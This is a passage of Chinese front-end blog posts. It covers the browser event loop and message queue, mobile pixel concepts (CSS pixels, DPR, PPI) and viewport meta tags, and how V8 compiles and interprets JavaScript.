<p>从图中可以看出，我们点击展开了<code>Main</code>这个项目，其记录了主线程执行过程中的所有任务。图中灰色的就是一个个任务，每个任务下面还有子任务，其中的 Parse HTML 任务，是把 HTML 解析为 DOM 的任务。值得注意的是，在执行 Parse HTML 的时候，如果遇到 JavaScript 脚本，那么会暂停当前的 HTML 解析而去执行 JavaScript 脚本。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul>
<li>如果有一些确定好的任务，可以使用一个单线程来按照顺序处理这些任务，这是第一版线程模型。</li>
<li>要在线程执行过程中接收并处理新的任务，就需要引入循环语句和事件系统，这是第二版线程模型。</li>
<li>如果要接收其他线程发送过来的任务，就需要引入消息队列，这是第三版线程模型。</li>
<li>如果其他进程想要发送任务给页面主线程，那么先通过 IPC 把任务发送给渲染进程的 IO 线程，IO 线程再把任务发送给页面主线程。</li>
<li>消息队列机制并不是太灵活，为了适应效率和实时性，引入了微任务。</li>
</ul>
<p>基于消息队列的设计是目前使用最广的消息架构，无论是安卓还是 Chrome 都采用了类似的任务机制。</p>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/JS/" rel="tag">JS</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/JS%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF%E6%9C%BA%E5%88%B6/" rel="tag">JS事件循环机制</a></li></ul>

    </footer>
  </div>

   
   
  
</article>

    
    <article
  id="post-前端/css/移动端响应式相关概念"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2019/11/25/%E5%89%8D%E7%AB%AF/css/%E7%A7%BB%E5%8A%A8%E7%AB%AF%E5%93%8D%E5%BA%94%E5%BC%8F%E7%9B%B8%E5%85%B3%E6%A6%82%E5%BF%B5/"
    >移动端响应式相关概念</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2019/11/25/%E5%89%8D%E7%AB%AF/css/%E7%A7%BB%E5%8A%A8%E7%AB%AF%E5%93%8D%E5%BA%94%E5%BC%8F%E7%9B%B8%E5%85%B3%E6%A6%82%E5%BF%B5/" class="article-date">
  <time datetime="2019-11-25T12:01:45.000Z" itemprop="datePublished">2019-11-25</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E5%89%8D%E7%AB%AF/">前端</a> / <a class="article-category-link" href="/categories/%E5%89%8D%E7%AB%AF/CSS/">CSS</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h1 id="CSS像素-CSS-pixels"><a href="#CSS像素-CSS-pixels" class="headerlink" title="CSS像素(CSS pixels)"></a>CSS像素(CSS pixels)</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>CSS像素是虚拟像素，可以理解为直觉像素，CSS和JS中使用的抽象单位，浏览器内的长度都是以CSS像素为单位的，CSS像素的单位是<code>px</code>。</p>
<h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>在CSS规范中，长度单位可以分为两类，绝对单位以及相对单位。<code>px</code>是一个相对单位，相对的是设备像素(<code>device pixel</code>)。在没有缩放的情况下，1个CSS像素等同于一个设备独立像素。</p>
<p>在同样一个设备上，每1个CSS像素所代表的物理像素是可以变化的。</p>
<p>在不同的设备之间，每1个CSS像素所代表的物理像素是可以变化的。</p>
<p>CSS像素在视觉上是很容易改变大小的，比如缩放浏览器页面，就是改变的CSS像素，当放大一倍，那么一个CSS像素在横向或者纵向上会覆盖两个设备独立像素。例如宽度<code>100px</code>像素，当页面放大一倍，它会在横向上由原本占据100个设备独立像素，变成占据200个设备独立像素；如果缩小，则恰好相反，只能占据50个设备独立像素。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">页面的缩放系数 = CSS像素 / 设备独立像素</span><br></pre></td></tr></table></figure>
<h2 id="px"><a href="#px" class="headerlink" title="px"></a>px</h2><p><code>px</code>实际是<code>pixel</code>（像素）的缩写，它是图像显示的基本单元，既不是一个确定的物理量，也不是一个点或者小方块，而是一个抽象概念。所以在谈论像素时一定要清楚它的上下文！</p>
<p>不同的设备，图像基本采样单元是不同的，显示器上的物理像素等于显示器的点距，而打印机的物理像素等于打印机的墨点。而衡量点距大小和打印机墨点大小的单位分别称为<code>ppi</code>和<code>dpi</code>：</p>
<ul>
<li><code>ppi</code>：每英寸多少像素数，放到显示器上说的是每英寸多少物理像素及显示器设备的点距。</li>
<li><code>dpi</code>：每英寸多少点。</li>
</ul>
<p>当用于描述显示器设备时<code>ppi</code>与<code>dpi</code>是同一个概念 。</p>
<h1 id="设备像素-device-pixels，DP"><a href="#设备像素-device-pixels，DP" class="headerlink" title="设备像素(device pixels，DP)"></a>设备像素(device pixels，DP)</h1><h2 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h2><p>设备像素也被称作物理像素，顾名思义，显示屏是由一个个物理像素点组成的，通过控制每个像素点的颜色，使屏幕显示出不同的图像，此像素是设备的固有属性，也就是说，从出厂的那一刻，设备像素已经固定，不会再发生改变。单位<code>pt</code>。</p>
<h2 id="注意-1"><a href="#注意-1" class="headerlink" title="注意"></a>注意</h2><p><code>pt</code>在CSS单位中属于真正的绝对单位，<code>1pt = 1/72(英寸)</code>，而1英寸等于2.54厘米。</p>
<p>通常使用分辨率来描述设备像素，例如<code>1920*1080</code>，表示设备横向有1920个像素点，纵向有1080个像素点。</p>
<!-- ## 设备像素(DP)与CSS像素之间的关系
设备像素和设备独立像素的比例关系叫做设备像素比。 -->
<h1 id="设备像素比-device-pixel-ratio，DPR"><a href="#设备像素比-device-pixel-ratio，DPR" class="headerlink" title="设备像素比(device pixel ratio，DPR)"></a>设备像素比(device pixel ratio，DPR)</h1><p>设备像素比描述的是未缩放状态下，设备像素和设备独立像素的比例关系。</p>
<p>在JS中可以通过<code>window.devicePixelRatio</code>获取。</p>
<p>在CSS中，可以通过<code>-webkit-device-pixel-ratio</code>，<code>-webkit-min-device-pixel-ratio</code>和<code>-webkit-max-device-pixel-ratio</code>进行媒体查询，对不同DPR的设备，做一些样式适配。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DPR = 设备像素 / 设备独立像素</span><br></pre></td></tr></table></figure>
<p>当这个比率为<code>1:1</code>时，使用1个设备像素显示1个CSS像素。当这个比率为<code>2:1</code>时，使用4个设备像素显示1个CSS像素，当这个比率为3:1时，使用9（3*3）个设备像素显示1个CSS像素。</p>
<h1 id="设备独立像素-Device-independent-Pixel，DIP"><a href="#设备独立像素-Device-independent-Pixel，DIP" class="headerlink" title="设备独立像素(Device independent Pixel，DIP)"></a>设备独立像素(Device independent Pixel，DIP)</h1><p>设备独立像素，也称为逻辑像素，简称DIP。</p>
<h2 id="由来"><a href="#由来" class="headerlink" title="由来"></a>由来</h2><p>从 iphone4 开始，苹果公司推出了 Retina 屏，物理像素变成<code>640 * 960</code>，但是屏幕尺寸没有变化，也就是说单位面积上的物理像素的数量增加了，或者说屏幕密度增加了。如果还按照原来那样，<code>1px</code>CSS 像素由 1 个物理像素来渲染， 那么<code>width: 320px</code>的元素只会占据半个屏幕的宽度。原来在 iphone3 上能够占满屏的网页，在 iphone4 上只会占一半的屏幕，同时<code>font-size: 20px</code>的字体在 iphone4 上的尺寸也会缩小。</p>
<p>为了让同一个网页在 iphone4 和 iphone3 上的有相同的显示效果，引入了独立像素的概念。iphone4 的独立像素为<code>320 * 480</code>，是 iphone4 的物理像素的一半，和 iphone3 的物理像素一样。也就是说，iphone4 上的 1 个独立像素 &#x3D; 2 个物理像素。在 iphone4 上，在不缩放的前提下，CSS 中的<code>1px</code>便由 1 个独立像素来渲染，相当于 2 个物理像素。这样，<code>width: 320px</code>的元素由 320 个独立像素来渲染，也就是由 640 个物理像素来渲染，正好占满 iphopn4 的屏幕宽度。<code>font-size: 20px</code>的字体在 iphone3 和 iphone4 上的尺寸也相同，只不过在 iphone4 上的字体更清楚。</p>
<h2 id="与CSS像素的关系"><a href="#与CSS像素的关系" class="headerlink" title="与CSS像素的关系"></a>与CSS像素的关系</h2><p>在没有缩放的情况下，1个CSS像素等同于一个设备独立像素。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CSS像素 = 设备独立像素</span><br></pre></td></tr></table></figure>
<p>因此DPR也可以用设备独立像素计算得出。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DPR = 设备像素 / CSS像素(或设备独立像素)</span><br></pre></td></tr></table></figure>
<h1 id="PPI-pixels-per-inch"><a href="#PPI-pixels-per-inch" class="headerlink" title="PPI(pixels per inch)"></a>PPI(pixels per inch)</h1><h2 id="定义-2"><a href="#定义-2" class="headerlink" title="定义"></a>定义</h2><p>每英寸像素取值，更确切的说法应该是像素密度，也就是衡量单位物理面积内拥有像素值的情况。</p>
<h2 id="PPI的计算"><a href="#PPI的计算" class="headerlink" title="PPI的计算"></a>PPI的计算</h2><p>已知屏幕分辨率和主对角线的尺寸，以iphone 6为例：</p>
<p><a target="_blank" rel="noopener" href="https://camo.githubusercontent.com/87b9207e9f1bc52b8a2d174f408a21d690d37814/687474703a2f2f75706c6f61642d696d616765732e6a69616e7368752e696f2f75706c6f61645f696d616765732f313939333433352d623766636565316134316239393766332e706e673f696d6167654d6f6772322f6175746f2d6f7269656e742f7374726970253743696d61676556696577322f322f772f31323430"><img src="https://upload-images.jianshu.io/upload_images/3534846-6036f72f4825f7c4?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></a> </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> 斜边尺寸 = <span class="title function_">V</span>(<span class="number">1920</span>^<span class="number">2</span>+<span class="number">1080</span>^<span class="number">2</span>) V代表开根号 </span><br><span class="line"><span class="keyword">var</span> ppi = 斜边尺寸/<span class="number">5.5</span> </span><br><span class="line">ppi = 401ppi</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://camo.githubusercontent.com/9233a97781fccdd468aba79b8944619cc9918b63/68747470733a2f2f7773312e73696e61696d672e636e2f6c617267652f303036744e6252776779316667386a7030653035316a3330737730376f6a73612e6a7067"><img src="https://upload-images.jianshu.io/upload_images/3534846-f9e103605fbb284b?imageMogr2/auto-orient/strip%7CimageView2/2/w/740"></a> </p>
<p><code>ppi</code>越高，每英寸像素点越多，图像越清晰；我们可以类比物体的密度，密度越大，单位体积的质量就越大，<code>ppi</code>越高，单位面积的像素越多。</p>
<h1 id="视口-viewport"><a href="#视口-viewport" class="headerlink" title="视口(viewport)"></a>视口(viewport)</h1><p>移动设备上有三个<code>viewport</code>：布局视口、视觉视口和理想视口。</p>
<h2 id="layout-viewport（布局视口）"><a href="#layout-viewport（布局视口）" class="headerlink" title="layout viewport（布局视口）"></a>layout viewport（布局视口）</h2><p><code>layout viewport</code>指的是我们可以进行网页布局区域的大小，以CSS像素做计量单位。移动设备默认会设置一个较大的<code>viewport</code>（如IOS一般默认是<code>980px</code>），<code>layout viewport</code>的宽度是大于浏览器可视区域的宽度的。</p>
<p><code>layout viewport</code>的宽度可以通过<code>document.documentElement.clientWidth</code>来获取。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="property">clientWidth</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="property">clientHeight</span></span><br></pre></td></tr></table></figure>
<h2 id="visual-viewport-（视觉视口）"><a href="#visual-viewport-（视觉视口）" class="headerlink" title="visual viewport （视觉视口）"></a>visual viewport （视觉视口）</h2><p><code>visual viewport</code>指的是浏览器可视区域的大小。<br><code>visual viewport</code>的宽度可以通过<code>window.innerWidth</code>来获取。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">innerWidth</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">innerHeight</span></span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://camo.githubusercontent.com/ab5ed1c0a848d65856d748771eab199965e7a6d9/68747470733a2f2f7773312e73696e61696d672e636e2f6c617267652f303036744e6337396779316667396c6162703165626a3330737130616a616d6d2e6a7067"><img src="https://upload-images.jianshu.io/upload_images/3534846-d49df5e97510c3f7?imageMogr2/auto-orient/strip%7CimageView2/2/w/740"></a> </p>
<h2 id="ideal-viewport（理想视口）"><a href="#ideal-viewport（理想视口）" class="headerlink" title="ideal viewport（理想视口）"></a>ideal viewport（理想视口）</h2><p><code>ideal viewport</code>是一个能完美适配移动设备的<code>viewport</code>。无论是在何种密度屏幕，何种分辨率下，显示出来的大小都差不多。<code>ideal viewport</code>并没有一个固定的尺寸，不同的设备有不同的<code>ideal viewport</code>。理想视口与设备的宽度一致，例如iphone8的理想视口是<code>375px</code>。</p>
<p><code>ideal viewport</code>的意义在于，无论在何种分辨率的屏幕下，针对<code>ideal viewport</code>而设计的网站，不需要缩放和横向滚动条都可以完美地呈现给用户。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">screen</span>.<span class="property">width</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">screen</span>.<span class="property">Height</span></span><br></pre></td></tr></table></figure>
<h2 id="利用meta标签对viewport进行控制"><a href="#利用meta标签对viewport进行控制" class="headerlink" title="利用meta标签对viewport进行控制"></a>利用meta标签对viewport进行控制</h2><p>移动设备默认的<code>viewport</code>是<code>layout viewport</code>，也就是那个比屏幕要宽的<code>viewport</code>，但在进行移动设备网站的开发时，我们需要的是<code>ideal viewport</code>。要得到<code>ideal viewport</code>就需要用到<code>meta</code>标签。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>该<code>meta</code>标签的作用是让当前<code>viewport</code>的宽度等于设备的宽度，同时不允许用户手动缩放。</p>
<p><code>meta viewport</code>有6个属性(暂且把<code>content</code>中的那些东西称为一个个属性和值)，如下：</p>
<table>
<thead>
<tr>
<th align="left">属性</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>width</code></td>
<td align="left">设置<code>layout viewport</code>的宽度，为一个整数，或字符串<code>&quot;device-width&quot;</code></td>
</tr>
<tr>
<td align="left"><code>initial-scale</code></td>
<td align="left">设置页面的初始缩放值，为一个数字，可以带小数</td>
</tr>
<tr>
<td align="left"><code>minimum-scale</code></td>
<td align="left">允许用户的最小缩放值，为一个数字，可以带小数</td>
</tr>
<tr>
<td align="left"><code>maximum-scale</code></td>
<td align="left">允许用户的最大缩放值，为一个数字，可以带小数</td>
</tr>
<tr>
<td align="left"><code>height</code></td>
<td align="left">设置<code>layout viewport</code>的高度，这个属性很少使用</td>
</tr>
<tr>
<td align="left"><code>user-scalable</code></td>
<td align="left">是否允许用户进行缩放，值为<code>&quot;no&quot;</code>或<code>&quot;yes&quot;</code></td>
</tr>
</tbody></table>
<p>这些属性可以同时使用，也可以单独使用或混合使用，多个属性同时使用时用逗号隔开就行了。</p>
<h2 id="把当前的viewport宽度设置为ideal-viewport的宽度"><a href="#把当前的viewport宽度设置为ideal-viewport的宽度" class="headerlink" title="把当前的viewport宽度设置为ideal viewport的宽度"></a>把当前的viewport宽度设置为ideal viewport的宽度</h2><p>要得到<code>ideal viewport</code>就必须把默认的<code>layout viewport</code>的宽度设为移动设备的屏幕宽度。因为<code>meta viewport</code>中的<code>width</code>能控制<code>layout viewport</code>的宽度，所以我们只需要把<code>width</code>设为<code>device-width</code>这个特殊的值就行了。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>通过<code>width=device-width</code>，所有浏览器都能把当前的<code>viewport</code>宽度变成<code>ideal viewport</code>的宽度，但要注意的是，在iphone和ipad上，无论是竖屏还是横屏，宽度都是竖屏时<code>ideal viewport</code>的宽度。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;initial-scale=1&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这句代码也能达到和前一句代码一样的效果，也可以把当前的的<code>viewport</code>变为<code>ideal viewport</code>。</p>
<p>因为从理论上来讲，这句代码的作用只是不对当前的页面进行缩放，也就是页面本该是多大就是多大。那为什么会有<code>width=device-width</code>的效果呢？</p>
<p>要想清楚这件事情，首先你得弄明白这个缩放是相对于什么来缩放的，因为这里的缩放值是1，也就是没缩放，但却达到了<code>ideal viewport</code>的效果，所以，那答案就只有一个了，缩放是相对于<code>ideal viewport</code>来进行缩放的，当对<code>ideal viewport</code>进行100%的缩放，也就是缩放值为1的时候，就得到了<code>ideal viewport</code>。</p>
<p>但如果<code>width</code>和<code>initial-scale=1</code>同时出现，并且还出现了冲突呢？比如：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=400, initial-scale=1&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>width=400</code>表示把当前<code>viewport</code>的宽度设为<code>400px</code>，<code>initial-scale=1</code>则表示把当前<code>viewport</code>的宽度设为<code>ideal viewport</code>的宽度，那么浏览器到底该服从哪个命令呢？当遇到这种情况时，浏览器会取它们两个中较大的那个值。例如，当<code>width=400</code>，<code>ideal viewport</code>的宽度为320时，取的是400；当<code>width=400</code>，<code>ideal viewport</code>的宽度为480时，取的是<code>ideal viewport</code>的宽度。</p>
<p>最后，总结一下，要把当前的<code>viewport</code>宽度设为<code>ideal viewport</code>的宽度，既可以设置<code>width=device-width</code>，也可以设置<code>initial-scale=1</code>，但这两者各有一个小缺陷，就是iphone、ipad以及IE会横竖屏不分，通通以竖屏的<code>ideal viewport</code>宽度为准。所以，最完美的写法应该是，两者都写上去，这样就<code>initial-scale=1</code>解决了iphone、ipad的毛病，<code>width=device-width</code>则解决了IE的毛病。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure> 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CSS/" rel="tag">CSS</a></li></ul>

    </footer>
  </div>

   
   
  
</article>

    
    <article
  id="post-前端/js/深入/JS内存机制——编译器和解释器"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2019/11/25/%E5%89%8D%E7%AB%AF/js/%E6%B7%B1%E5%85%A5/JS%E5%86%85%E5%AD%98%E6%9C%BA%E5%88%B6%E2%80%94%E2%80%94%E7%BC%96%E8%AF%91%E5%99%A8%E5%92%8C%E8%A7%A3%E9%87%8A%E5%99%A8/"
    >JS内存机制——编译器和解释器</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2019/11/25/%E5%89%8D%E7%AB%AF/js/%E6%B7%B1%E5%85%A5/JS%E5%86%85%E5%AD%98%E6%9C%BA%E5%88%B6%E2%80%94%E2%80%94%E7%BC%96%E8%AF%91%E5%99%A8%E5%92%8C%E8%A7%A3%E9%87%8A%E5%99%A8/" class="article-date">
  <time datetime="2019-11-25T09:28:41.000Z" itemprop="datePublished">2019-11-25</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E5%89%8D%E7%AB%AF/">前端</a> / <a class="article-category-link" href="/categories/%E5%89%8D%E7%AB%AF/JS/">JS</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h1 id="编译器和解释器"><a href="#编译器和解释器" class="headerlink" title="编译器和解释器"></a>编译器和解释器</h1><p>之所以存在编译器和解释器，是因为机器不能直接理解我们所写的代码，所以在执行程序之前，需要将我们所写的代码“翻译”成机器能读懂的机器语言。按语言的执行流程，可以把语言划分为编译型语言和解释型语言。</p>
<p>编译型语言在程序执行之前，需要经过编译器的编译过程，并且编译之后会直接保留机器能读懂的二进制文件，这样每次运行程序时，都可以直接运行该二进制文件，而不需要再次重新编译了。比如 C&#x2F;C++、GO 等都是编译型语言。</p>
<p>而由解释型语言编写的程序，在每次运行时都需要通过解释器对程序进行动态解释和执行。比如 Python、JavaScript 等都属于解释型语言。</p>
<p>那编译器和解释器是如何“翻译”代码的呢？具体流程你可以参考下图：</p>
<img src="/2019/11/25/%E5%89%8D%E7%AB%AF/js/%E6%B7%B1%E5%85%A5/JS%E5%86%85%E5%AD%98%E6%9C%BA%E5%88%B6%E2%80%94%E2%80%94%E7%BC%96%E8%AF%91%E5%99%A8%E5%92%8C%E8%A7%A3%E9%87%8A%E5%99%A8/img1.png" class="" title="编译器和解释器“翻译”代码">

<p>从图中你可以看出这二者的执行流程，大致可阐述为如下：</p>
<p>在编译型语言的编译过程中，编译器首先会依次对源代码进行词法分析、语法分析，生成抽象语法树（AST），然后是优化代码，最后再生成处理器能够理解的机器码。如果编译成功，将会生成一个可执行的文件。但如果编译过程发生了语法或者其他的错误，那么编译器就会抛出异常，最后的二进制文件也不会生成成功。</p>
<p>在解释型语言的解释过程中，同样解释器也会对源代码进行词法分析、语法分析，并生成抽象语法树（AST），不过它会再基于抽象语法树生成字节码，最后再根据字节码来执行程序、输出结果。</p>
<h1 id="V8是如何执行一段-JavaScript-代码的"><a href="#V8是如何执行一段-JavaScript-代码的" class="headerlink" title="V8是如何执行一段 JavaScript 代码的"></a>V8是如何执行一段 JavaScript 代码的</h1><p>你可以先来“一览全局”，参考下图：</p>
<img src="/2019/11/25/%E5%89%8D%E7%AB%AF/js/%E6%B7%B1%E5%85%A5/JS%E5%86%85%E5%AD%98%E6%9C%BA%E5%88%B6%E2%80%94%E2%80%94%E7%BC%96%E8%AF%91%E5%99%A8%E5%92%8C%E8%A7%A3%E9%87%8A%E5%99%A8/img2.png" class="" title="V8 执行一段代码流程图">

<p>从图中可以清楚地看到，V8 在执行过程中既有解释器 Ignition，又有编译器 TurboFan，那么它们是如何配合去执行一段 JavaScript 代码的呢? 下面我们就按照上图来一一分解其执行流程。</p>
<h2 id="1-生成抽象语法树（AST）和执行上下文"><a href="#1-生成抽象语法树（AST）和执行上下文" class="headerlink" title="1. 生成抽象语法树（AST）和执行上下文"></a>1. 生成抽象语法树（AST）和执行上下文</h2><p>将源代码转换为抽象语法树，并生成执行上下文，执行上下文主要是代码在执行过程中的环境信息。</p>
<p>高级语言是开发者可以理解的语言，但是让编译器或者解释器来理解就非常困难了。对于编译器或者解释器来说，它们可以理解的就是 AST 了。所以无论你使用的是解释型语言还是编译型语言，在编译过程中，它们都会生成一个 AST。这和渲染引擎将 HTML 格式文件转换为计算机可以理解的 DOM 树的情况类似。</p>
<p>你可以结合下面这段代码来直观地感受下什么是 AST：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> myName = <span class="string">&quot; 极客时间 &quot;</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">23</span>;</span><br><span class="line">&#125;</span><br><span class="line">myName = <span class="string">&quot;geektime&quot;</span></span><br><span class="line"><span class="title function_">foo</span>()</span><br></pre></td></tr></table></figure>
<p>这段代码经过<code>javascript-ast</code>站点处理后，生成的 AST 结构如下：</p>
<img src="/2019/11/25/%E5%89%8D%E7%AB%AF/js/%E6%B7%B1%E5%85%A5/JS%E5%86%85%E5%AD%98%E6%9C%BA%E5%88%B6%E2%80%94%E2%80%94%E7%BC%96%E8%AF%91%E5%99%A8%E5%92%8C%E8%A7%A3%E9%87%8A%E5%99%A8/img3.png" class="" title="抽象语法树（AST）结构">

<p>从图中可以看出，AST 的结构和代码的结构非常相似，其实你也可以把 AST 看成代码的结构化的表示，编译器或者解释器后续的工作都需要依赖于 AST，而不是源代码。</p>
<p>AST 是非常重要的一种数据结构，在很多项目中有着广泛的应用。其中最著名的一个项目是 Babel。Babel 是一个被广泛使用的代码转码器，可以将 ES6 代码转为 ES5 代码，这意味着你可以现在就用 ES6 编写程序，而不用担心现有环境是否支持 ES6。Babel 的工作原理就是先将 ES6 源码转换为 AST，然后再将 ES6 语法的 AST 转换为 ES5 语法的 AST，最后利用 ES5 的 AST 生成 JavaScript 源代码。</p>
<p>除了 Babel 外，还有 ESLint 也使用 AST。ESLint 是一个用来检查 JavaScript 编写规范的插件，其检测流程也是需要将源码转换为 AST，然后再利用 AST 来检查代码规范化的问题。</p>
<p>通常，生成 AST 需要经过两个阶段。</p>
<p>第一阶段是分词（tokenize），又称为词法分析，其作用是将一行行的源码拆解成一个个 token。所谓token，指的是语法上不可能再分的、最小的单个字符或字符串。你可以参考下图来更好地理解什么 token。</p>
<img src="/2019/11/25/%E5%89%8D%E7%AB%AF/js/%E6%B7%B1%E5%85%A5/JS%E5%86%85%E5%AD%98%E6%9C%BA%E5%88%B6%E2%80%94%E2%80%94%E7%BC%96%E8%AF%91%E5%99%A8%E5%92%8C%E8%A7%A3%E9%87%8A%E5%99%A8/img4.png" class="" title="分解 token 示意图">

<p>从图中可以看出，通过<code>var myName = “极客时间”</code>简单地定义了一个变量，其中关键字<code>var</code>、标识符<code>myName</code>、赋值运算符<code>=</code>、字符串“极客时间”四个都是<code>token</code>，而且它们代表的属性还不一样。</p>
<p>第二阶段是解析（<code>parse</code>），又称为语法分析，其作用是将上一步生成的<code>token</code>数据，根据语法规则转为 AST。如果源码符合语法规则，这一步就会顺利完成。但如果源码存在语法错误，这一步就会终止，并抛出一个“语法错误”。</p>
<p>这就是 AST 的生成过程，先分词，再解析。</p>
<p>有了 AST 后，那接下来 V8 就会生成该段代码的执行上下文。</p>
<h2 id="2-生成字节码"><a href="#2-生成字节码" class="headerlink" title="2. 生成字节码"></a>2. 生成字节码</h2><p>有了 AST 和执行上下文后，那接下来的第二步，解释器 Ignition 会根据 AST 生成字节码，并解释执行字节码。</p>
<p>其实一开始 V8 并没有字节码，而是直接将 AST 转换为机器码，由于执行机器码的效率是非常高效的，所以这种方式在发布后的一段时间内运行效果是非常好的。但是随着 Chrome 在手机上的广泛普及，特别是运行在 512M 内存的手机上，内存占用问题也暴露出来了，因为 V8 需要消耗大量的内存来存放转换后的机器码。为了解决内存占用问题，V8 团队大幅重构了引擎架构，引入字节码，并且抛弃了之前的编译器，最终花了将进四年的时间，实现了现在的这套架构。</p>
<p>那什么是字节码呢？为什么引入字节码就能解决内存占用问题呢？</p>
<p>字节码就是介于 AST 和机器码之间的一种代码。但是与特定类型的机器码无关，字节码需要通过解释器将其转换为机器码后才能执行。</p>
<p>理解了什么是字节码，我们再来对比下高级代码、字节码和机器码，你可以参考下图：</p>
<img src="/2019/11/25/%E5%89%8D%E7%AB%AF/js/%E6%B7%B1%E5%85%A5/JS%E5%86%85%E5%AD%98%E6%9C%BA%E5%88%B6%E2%80%94%E2%80%94%E7%BC%96%E8%AF%91%E5%99%A8%E5%92%8C%E8%A7%A3%E9%87%8A%E5%99%A8/img5.png" class="" title="字节码和机器码占用空间对比">

<p>从图中可以看出，机器码所占用的空间远远超过了字节码，所以使用字节码可以减少系统的内存使用。</p>
<h2 id="3-执行代码"><a href="#3-执行代码" class="headerlink" title="3. 执行代码"></a>3. 执行代码</h2><p>生成字节码之后，接下来就要进入执行阶段了。</p>
<p>通常，如果有一段第一次执行的字节码，解释器 Ignition 会逐条解释执行。在执行字节码的过程中，如果发现有热点代码（HotSpot），比如一段代码被重复执行多次，这种就称为热点代码，那么后台的编译器 TurboFan 就会把该段热点的字节码编译为高效的机器码，然后当再次执行这段被优化的代码时，只需要执行编译后的机器码就可以了，这样就大大提升了代码的执行效率。</p>
